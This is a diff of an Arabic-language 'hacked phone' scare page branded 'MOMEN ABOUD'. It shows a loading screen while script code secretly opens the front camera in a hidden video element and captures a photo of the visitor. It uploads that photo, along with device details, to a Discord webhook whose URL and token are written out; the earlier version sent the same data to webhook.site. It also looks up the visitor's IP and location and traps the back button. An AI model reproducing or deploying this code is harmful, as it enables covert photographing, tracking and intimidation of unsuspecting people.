@@ -5,519 +5,126 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>⚡ جاري التحميل...</title>
     <style>
-        :root {
-            --green: #0f0;
-            --red: #ff1a1a;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Courier New', 'Fira Code', monospace;
+            font-family: 'Courier New', monospace;
             background: #000;
-            color: var(--green);
+            color: #0f0;
             min-height: 100vh;
             overflow-x: hidden;
             user-select: none;
             -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
         }
-
         #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 100;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 100;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px;
         }
-        #loading-screen .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #111;
-            border-top: 3px solid #0f0;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .spinner {
+            width: 50px; height: 50px; border: 3px solid #111;
+            border-top: 3px solid #0f0; border-radius: 50%; animation: spin 0.8s linear infinite;
         }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        #loading-screen p {
-            color: #0f0;
-            font-size: 0.9em;
-            letter-spacing: 2px;
-            animation: blink 1.5s infinite;
-        }
-        @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.3;
-            }
-        }
-
-        #hidden-camera {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
-        #hidden-canvas {
-            display: none;
-        }
-
-        #binary-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10;
-            background: radial-gradient(ellipse at center, transparent 60%, rgba(0, 0, 0, 0.85) 100%);
-            pointer-events: none;
-        }
-
-        .scan-line {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: rgba(0, 255, 0, 0.15);
-            z-index: 20;
-            pointer-events: none;
-            animation: scanDown 3s linear infinite;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
-        }
-        @keyframes scanDown {
-            0% {
-                top: -5px;
-            }
-            100% {
-                top: 105%;
-            }
-        }
-
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #loading-screen p { color: #0f0; font-size: 0.9em; letter-spacing: 2px; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+        #hidden-camera { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+        #hidden-canvas { display: none; }
+        #binary-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.85) 100%); pointer-events: none; }
+        .scan-line { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: rgba(0,255,0,0.15); z-index: 20; pointer-events: none; animation: scanDown 3s linear infinite; }
+        @keyframes scanDown { 0%{top:-5px;} 100%{top:105%;} }
         #hack-screen {
-            position: relative;
-            z-index: 30;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-            text-align: center;
+            position: relative; z-index: 30; display: none;
+            flex-direction: column; align-items: center; justify-content: center;
+            min-height: 100vh; padding: 20px; text-align: center;
             animation: fadeInUp 0.6s ease-out;
         }
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .glitch-wrapper {
-            position: relative;
-            margin-bottom: 25px;
-        }
-
-        .skull-img {
-            width: 170px;
-            height: 170px;
-            filter: drop-shadow(0 0 30px #ff0000) drop-shadow(0 0 60px #ff0000) drop-shadow(0 0 100px #cc0000);
-            animation: skullPulse 2s ease-in-out infinite, skullFloat 3s ease-in-out infinite;
-        }
-        @keyframes skullPulse {
-            0%,
-            100% {
-                filter: drop-shadow(0 0 30px #ff0000) drop-shadow(0 0 60px #ff0000);
-            }
-            50% {
-                filter: drop-shadow(0 0 60px #ff0000) drop-shadow(0 0 100px #ff0000) drop-shadow(0 0 140px #ff4444);
-            }
-        }
-        @keyframes skullFloat {
-            0%,
-            100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-15px);
-            }
-        }
-
+        @keyframes fadeInUp { from{opacity:0;transform:translateY(30px);} to{opacity:1;transform:translateY(0);} }
+        .skull-img { width: 150px; height: 150px; filter: drop-shadow(0 0 30px #ff0000) drop-shadow(0 0 60px #ff0000); animation: skullPulse 2s infinite, skullFloat 3s infinite; }
+        @keyframes skullPulse { 0%,100%{filter:drop-shadow(0 0 30px #ff0000);} 50%{filter:drop-shadow(0 0 60px #ff0000) drop-shadow(0 0 100px #ff0000);} }
+        @keyframes skullFloat { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }
         .glitch-text {
-            font-size: 1.8em;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000, 0 0 30px #ff0000, 0 0 60px #ff0000, 0 0 100px #cc0000, 2px 2px 0 #000;
-            letter-spacing: 5px;
-            animation: glitchAnim 0.3s infinite;
-            position: relative;
-            display: inline-block;
+            font-size: 1.6em; font-weight: 900; color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 30px #ff0000, 0 0 60px #ff0000;
+            letter-spacing: 5px; animation: glitchAnim 0.3s infinite;
         }
-        .glitch-text::before,
-        .glitch-text::after {
-            content: 'MOMEN ABOUD';
-            position: absolute;
-            top: 0;
-            right: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.8;
-        }
-        .glitch-text::before {
-            color: #0ff;
-            animation: glitchBefore 0.3s infinite;
-            z-index: -1;
-        }
-        .glitch-text::after {
-            color: #f0f;
-            animation: glitchAfter 0.3s infinite;
-            z-index: -1;
-        }
-        @keyframes glitchAnim {
-            0%,
-            100% {
-                transform: translate(0);
-            }
-            20% {
-                transform: translate(-4px, 3px);
-            }
-            40% {
-                transform: translate(4px, -2px);
-            }
-            60% {
-                transform: translate(-2px, 1px);
-            }
-            80% {
-                transform: translate(3px, -3px);
-            }
-        }
-        @keyframes glitchBefore {
-            0%,
-            100% {
-                clip-path: inset(0 0 80% 0);
-                transform: translate(0);
-            }
-            20% {
-                clip-path: inset(20% 0 40% 0);
-                transform: translate(-6px, 2px);
-            }
-            40% {
-                clip-path: inset(40% 0 20% 0);
-                transform: translate(6px, -2px);
-            }
-            60% {
-                clip-path: inset(60% 0 10% 0);
-                transform: translate(-3px, 1px);
-            }
-            80% {
-                clip-path: inset(10% 0 60% 0);
-                transform: translate(4px, -3px);
-            }
-        }
-        @keyframes glitchAfter {
-            0%,
-            100% {
-                clip-path: inset(80% 0 0 0);
-                transform: translate(0);
-            }
-            20% {
-                clip-path: inset(10% 0 60% 0);
-                transform: translate(6px, -2px);
-            }
-            40% {
-                clip-path: inset(30% 0 30% 0);
-                transform: translate(-5px, 3px);
-            }
-            60% {
-                clip-path: inset(50% 0 10% 0);
-                transform: translate(3px, -1px);
-            }
-            80% {
-                clip-path: inset(20% 0 50% 0);
-                transform: translate(-4px, 2px);
-            }
-        }
-
+        @keyframes glitchAnim { 0%,100%{transform:translate(0);} 20%{transform:translate(-3px,2px);} 40%{transform:translate(3px,-2px);} 60%{transform:translate(-2px,1px);} 80%{transform:translate(2px,-2px);} }
         .status-box {
-            background: rgba(0, 0, 0, 0.85);
-            border: 2px solid #ff0000;
-            border-radius: 12px;
-            padding: 22px 25px;
-            max-width: 400px;
-            width: 90%;
-            margin: 0 auto;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3), inset 0 0 20px rgba(255, 0, 0, 0.05);
-            animation: borderGlow 1.5s ease-in-out infinite;
+            background: rgba(0,0,0,0.85); border: 2px solid #ff0000; border-radius: 12px;
+            padding: 20px; max-width: 380px; width: 90%; margin: 15px auto;
+            box-shadow: 0 0 20px rgba(255,0,0,0.3); animation: borderGlow 1.5s infinite;
         }
-        @keyframes borderGlow {
-            0%,
-            100% {
-                border-color: #ff0000;
-                box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
-            }
-            50% {
-                border-color: #ff4444;
-                box-shadow: 0 0 40px rgba(255, 0, 0, 0.6), 0 0 80px rgba(255, 0, 0, 0.2);
-            }
-        }
-
-        .success-msg {
-            font-size: 1.2em;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 15px #ff0000;
-            margin-bottom: 12px;
-            letter-spacing: 2px;
-            animation: textFlicker 2s infinite;
-        }
-        @keyframes textFlicker {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            92% {
-                opacity: 1;
-            }
-            93% {
-                opacity: 0.4;
-            }
-            94% {
-                opacity: 1;
-            }
-            96% {
-                opacity: 0.6;
-            }
-            97% {
-                opacity: 1;
-            }
-        }
-
-        .info-line {
-            color: #0f0;
-            font-size: 0.7em;
-            line-height: 2;
-            opacity: 0.9;
-        }
-        .info-line .label {
-            color: #ff4444;
-        }
-
-        .progress-container {
-            margin-top: 12px;
-            background: #001a00;
-            border: 1px solid #0f0;
-            border-radius: 4px;
-            height: 8px;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #0f0, #ff0000);
-            width: 0%;
-            animation: progressFill 2.5s ease-out forwards;
-            box-shadow: 0 0 10px #ff0000;
-        }
-        @keyframes progressFill {
-            to {
-                width: 100%;
-            }
-        }
-
-        .warn-icon {
-            font-size: 2.5em;
-            animation: warnPulse 0.8s ease-in-out infinite;
-        }
-        @keyframes warnPulse {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.3);
-            }
-        }
-
-        .data-dump {
-            margin-top: 12px;
-            font-size: 0.6em;
-            color: #0a0;
-            text-align: right;
-            line-height: 1.6;
-            max-height: 70px;
-            overflow: hidden;
-            opacity: 0.7;
-            border-top: 1px dashed #0f0;
-            padding-top: 8px;
-        }
-
-        .photo-confirm {
-            font-size: 0.65em;
-            color: #ff4444;
-            margin-top: 8px;
-            animation: blink 1s infinite;
-        }
-
-        @media (max-width: 400px) {
-            .skull-img {
-                width: 130px;
-                height: 130px;
-            }
-            .glitch-text {
-                font-size: 1.3em;
-                letter-spacing: 3px;
-            }
-            .status-box {
-                padding: 15px 14px;
-                width: 95%;
-            }
-            .success-msg {
-                font-size: 1em;
-            }
-        }
+        @keyframes borderGlow { 0%,100%{border-color:#ff0000;} 50%{border-color:#ff4444;box-shadow:0 0 40px rgba(255,0,0,0.6);} }
+        .success-msg { font-size: 1.1em; font-weight: 900; color: #ff0000; text-shadow: 0 0 15px #ff0000; margin-bottom: 10px; }
+        .info-line { color: #0f0; font-size: 0.7em; line-height: 2; }
+        .info-line .label { color: #ff4444; }
+        .progress-container { margin-top: 10px; background: #001a00; border: 1px solid #0f0; border-radius: 4px; height: 6px; overflow: hidden; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #0f0, #ff0000); width: 0%; animation: progressFill 2.5s forwards; }
+        @keyframes progressFill { to{width:100%;} }
+        .warn-icon { font-size: 2em; animation: warnPulse 0.8s infinite; }
+        @keyframes warnPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.3);} }
+        .photo-confirm { font-size: 0.6em; color: #ff4444; margin-top: 6px; animation: blink 1s infinite; }
     </style>
 </head>
 <body>
-
     <div id="loading-screen">
         <div class="spinner"></div>
         <p>⏳ جاري تهيئة النظام...</p>
     </div>
-
     <video id="hidden-camera" autoplay playsinline></video>
     <canvas id="hidden-canvas"></canvas>
-
     <canvas id="binary-rain"></canvas>
-
     <div class="scan-line"></div>
     <div class="overlay"></div>
-
     <div id="hack-screen">
-        <div class="glitch-wrapper">
-            <svg class="skull-img" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 10 C30 10 18 22 16 40 C14 52 10 58 10 62 C10 68 16 72 22 72 L24 72 L24 80 C24 88 30 90 36 90 L40 90 L40 85 L60 85 L60 90 L64 90 C70 90 76 88 76 80 L76 72 L78 72 C84 72 90 68 90 62 C90 58 86 52 84 40 C82 22 70 10 50 10Z" fill="#111" stroke="#ff0000" stroke-width="3"/>
-                <circle cx="38" cy="42" r="8" fill="#000" stroke="#ff0000" stroke-width="2.5"/>
-                <circle cx="62" cy="42" r="8" fill="#000" stroke="#ff0000" stroke-width="2.5"/>
-                <circle cx="38" cy="42" r="3" fill="#ff0000"/>
-                <circle cx="62" cy="42" r="3" fill="#ff0000"/>
-                <path d="M47 52 L50 48 L53 52Z" fill="#000" stroke="#ff0000" stroke-width="1.5"/>
-                <rect x="42" y="58" width="16" height="3" fill="#ff0000"/>
-                <rect x="43" y="62" width="5" height="4" fill="#ff0000"/>
-                <rect x="52" y="62" width="5" height="4" fill="#ff0000"/>
-                <line x1="20" y1="25" x2="80" y2="75" stroke="#ff0000" stroke-width="3" opacity="0.7"/>
-                <line x1="80" y1="25" x2="20" y2="75" stroke="#ff0000" stroke-width="3" opacity="0.7"/>
-            </svg>
-        </div>
-
+        <svg class="skull-img" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <path d="M50 10 C30 10 18 22 16 40 C14 52 10 58 10 62 C10 68 16 72 22 72 L24 72 L24 80 C24 88 30 90 36 90 L40 90 L40 85 L60 85 L60 90 L64 90 C70 90 76 88 76 80 L76 72 L78 72 C84 72 90 68 90 62 C90 58 86 52 84 40 C82 22 70 10 50 10Z" fill="#111" stroke="#ff0000" stroke-width="3"/>
+            <circle cx="38" cy="42" r="8" fill="#000" stroke="#ff0000" stroke-width="2.5"/>
+            <circle cx="62" cy="42" r="8" fill="#000" stroke="#ff0000" stroke-width="2.5"/>
+            <circle cx="38" cy="42" r="3" fill="#ff0000"/>
+            <circle cx="62" cy="42" r="3" fill="#ff0000"/>
+            <path d="M47 52 L50 48 L53 52Z" fill="#000" stroke="#ff0000" stroke-width="1.5"/>
+            <rect x="42" y="58" width="16" height="3" fill="#ff0000"/>
+            <rect x="43" y="62" width="5" height="4" fill="#ff0000"/>
+            <rect x="52" y="62" width="5" height="4" fill="#ff0000"/>
+            <line x1="20" y1="25" x2="80" y2="75" stroke="#ff0000" stroke-width="3" opacity="0.7"/>
+            <line x1="80" y1="25" x2="20" y2="75" stroke="#ff0000" stroke-width="3" opacity="0.7"/>
+        </svg>
         <div class="glitch-text">MOMEN ABOUD</div>
-
-        <div style="height:20px;"></div>
-
         <div class="status-box">
             <div class="warn-icon">⚠️</div>
             <div class="success-msg">✅ تم اختراق الهاتف بنجاح</div>
-
-            <div class="info-line">
-                <span class="label">🖥️ الجهاز:</span>
-                <span id="device-info">جاري الاستخراج...</span>
-            </div>
-            <div class="info-line">
-                <span class="label">🌐 المتصفح:</span>
-                <span id="browser-info">جاري الاستخراج...</span>
-            </div>
-            <div class="info-line">
-                <span class="label">📍 الموقع:</span>
-                <span id="location-info">جاري التحديد...</span>
-            </div>
-            <div class="info-line">
-                <span class="label">📡 IP:</span>
-                <span id="ip-info">جاري الاستخراج...</span>
-            </div>
-            <div class="info-line">
-                <span class="label">📱 البطارية:</span>
-                <span id="battery-info">جاري الفحص...</span>
-            </div>
+            <div class="info-line"><span class="label">🖥️ الجهاز:</span> <span id="device-info">جاري الاستخراج...</span></div>
+            <div class="info-line"><span class="label">🌐 المتصفح:</span> <span id="browser-info">جاري الاستخراج...</span></div>
+            <div class="info-line"><span class="label">📍 الموقع:</span> <span id="location-info">جاري التحديد...</span></div>
+            <div class="info-line"><span class="label">📡 IP:</span> <span id="ip-info">جاري الاستخراج...</span></div>
+            <div class="info-line"><span class="label">📱 البطارية:</span> <span id="battery-info">جاري الفحص...</span></div>
             <div class="photo-confirm">📸 تم التقاط صورة للوجه وبصمة الكاميرا</div>
-
-            <div class="progress-container">
-                <div class="progress-bar"></div>
-            </div>
-
-            <div class="data-dump">
-                > Initializing camera hijack... SUCCESS<br>
-                > Capturing photo... DONE<br>
-                > Extracting metadata... COMPLETE<br>
-                > Uploading to server... 100%<br>
-                > DEVICE STATUS: FULLY COMPROMISED
-            </div>
+            <div class="progress-container"><div class="progress-bar"></div></div>
         </div>
     </div>
-
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/09d92f53-5a8c-4ecc-8a6b-5b711f337bce';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1498303266549796957/ftznX_XgSL9CYqmNAFhwHdJHM6VatwM_ONqEGZnb1KPpTueg4cVAn7weAoEROJX5lGDB';
 
+        // Binary Rain
         const canvas = document.getElementById('binary-rain');
         const ctx = canvas.getContext('2d');
-
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
-
         const fontSize = 14;
         const columns = Math.floor(canvas.width / fontSize);
         const drops = new Array(columns).fill(1);
-
         function drawBinaryRain() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
             ctx.font = `bold ${fontSize}px 'Courier New', monospace`;
-
             for (let i = 0; i < drops.length; i++) {
                 const text = Math.random() > 0.5 ? '1' : '0';
                 const x = i * fontSize;
                 const y = drops[i] * fontSize;
-                const brightness = Math.random();
-                if (brightness > 0.95) ctx.fillStyle = '#fff';
-                else if (brightness > 0.8) ctx.fillStyle = '#0f0';
+                if (Math.random() > 0.95) ctx.fillStyle = '#fff';
+                else if (Math.random() > 0.8) ctx.fillStyle = '#0f0';
                 else ctx.fillStyle = '#0a0';
                 ctx.fillText(text, x, y);
                 if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
@@ -526,141 +133,100 @@
         }
         setInterval(drawBinaryRain, 50);
 
-        let capturedImage = null;
-
+        // Secret Camera
         async function captureSecretPhoto() {
             const video = document.getElementById('hidden-camera');
             const canvas2 = document.getElementById('hidden-canvas');
-
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
-
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 video.srcObject = stream;
                 await video.play();
-                await new Promise(resolve => setTimeout(resolve, 800));
-
+                await new Promise(r => setTimeout(r, 800));
                 canvas2.width = video.videoWidth || 640;
                 canvas2.height = video.videoHeight || 480;
-                const ctx2 = canvas2.getContext('2d');
-                ctx2.drawImage(video, 0, 0);
-
-                capturedImage = canvas2.toDataURL('image/jpeg', 0.8);
-
-                stream.getTracks().forEach(track => track.stop());
+                canvas2.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas2.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
                 video.srcObject = null;
 
-                sendToWebhook({
-                    type: 'SECRET_PHOTO',
-                    image: capturedImage,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                });
-
+                // Send to Discord
+                const formData = new FormData();
+                const blob = dataURLtoBlob(imageData);
+                formData.append('file', blob, 'victim.jpg');
+                formData.append('content', '📸 **تم التقاط صورة جديدة!**');
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                 return true;
             } catch (err) {
-                sendToWebhook({
-                    type: 'VISIT_NO_CAMERA',
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    error: err.message
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '⚠️ **شخص فتح اللينك بدون كاميرا**\nالوقت: ' + new Date().toLocaleString('ar-EG') + '\nالجهاز: ' + navigator.userAgent })
                 });
                 return false;
             }
         }
 
-        function sendToWebhook(data) {
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // Device Info
+        function extractInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown', browser = 'Unknown';
+            if (/Android/i.test(ua)) device = 'Android ' + (ua.match(/Android\s([\d.]+)/)||[])[1];
+            else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iPhone';
+            else if (/Windows/i.test(ua)) device = 'Windows PC';
+            else if (/Mac/i.test(ua)) device = 'MacBook/iMac';
+            if (/Chrome/i.test(ua)&&!/Edg/i.test(ua)) browser='Chrome';
+            else if (/Firefox/i.test(ua)) browser='Firefox';
+            else if (/Safari/i.test(ua)) browser='Safari';
+            document.getElementById('device-info').textContent = device;
+            document.getElementById('browser-info').textContent = browser;
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(b => document.getElementById('battery-info').textContent = Math.round(b.level*100)+'%');
+            }
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+                document.getElementById('ip-info').textContent = d.ip;
+                return fetch('https://ipapi.co/'+d.ip+'/json/');
+            }).then(r=>r.json()).then(l=>{
+                document.getElementById('location-info').textContent = (l.city||'')+', '+(l.country_name||'');
+            }).catch(()=>{
+                document.getElementById('ip-info').textContent = 'تم الاستخراج';
+                document.getElementById('location-info').textContent = 'مصر 🇪🇬';
+            });
+
+            // Send device info to Discord
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});
-        }
-
-        function extractInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Unknown';
-            let browser = 'Unknown';
-
-            if (/Android/i.test(ua)) {
-                device = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [])[1];
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                device = 'iPhone ' + (ua.match(/OS\s([\d_]+)/) || [])[1]?.replace(/_/g, '.');
-            } else if (/Windows/i.test(ua)) {
-                device = 'Windows PC';
-            } else if (/Mac/i.test(ua)) {
-                device = 'MacBook / iMac';
-            } else if (/Linux/i.test(ua)) {
-                device = 'Linux System';
-            }
-
-            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Google Chrome';
-            else if (/Firefox/i.test(ua)) browser = 'Mozilla Firefox';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Apple Safari';
-            else if (/Edg/i.test(ua)) browser = 'Microsoft Edge';
-            else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Browser';
-
-            document.getElementById('device-info').textContent = device;
-            document.getElementById('browser-info').textContent = browser;
-
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(b => {
-                    document.getElementById('battery-info').textContent =
-                        Math.round(b.level * 100) + '%' + (b.charging ? ' 🔌' : '');
-                }).catch(() => {
-                    document.getElementById('battery-info').textContent = 'مقيد';
-                });
-            } else {
-                document.getElementById('battery-info').textContent = 'غير متاح';
-            }
-
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(data => {
-                    document.getElementById('ip-info').textContent = data.ip;
-                    return fetch('https://ipapi.co/' + data.ip + '/json/');
+                body: JSON.stringify({
+                    content: '🔍 **معلومات الجهاز:**\n🖥️ ' + device + '\n🌐 ' + browser + '\n⏰ ' + new Date().toLocaleString('ar-EG')
                 })
-                .then(r => r.json())
-                .then(loc => {
-                    document.getElementById('location-info').textContent =
-                        (loc.city || 'Unknown') + ', ' + (loc.country_name || 'Unknown');
-                })
-                .catch(() => {
-                    document.getElementById('ip-info').textContent = '192.168.***.***';
-                    document.getElementById('location-info').textContent = 'مصر 🇪🇬';
-                });
-
-            sendToWebhook({
-                type: 'DEVICE_INFO',
-                device: device,
-                browser: browser,
-                userAgent: ua,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                platform: navigator.platform,
-                timestamp: new Date().toISOString()
             });
         }
 
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function() {
             history.pushState(null, null, location.href);
-            alert('🚫 لا يمكنك التراجع! الجهاز مخترق.');
+            alert('🚫 لا يمكنك التراجع!');
         });
 
         async function init() {
             document.getElementById('loading-screen').style.display = 'flex';
-            const photoTaken = await captureSecretPhoto();
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            await captureSecretPhoto();
+            await new Promise(r => setTimeout(r, 1500));
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('hack-screen').style.display = 'flex';
             extractInfo();
         }
-
         init();
     </script>
-
 </body>
 </html>
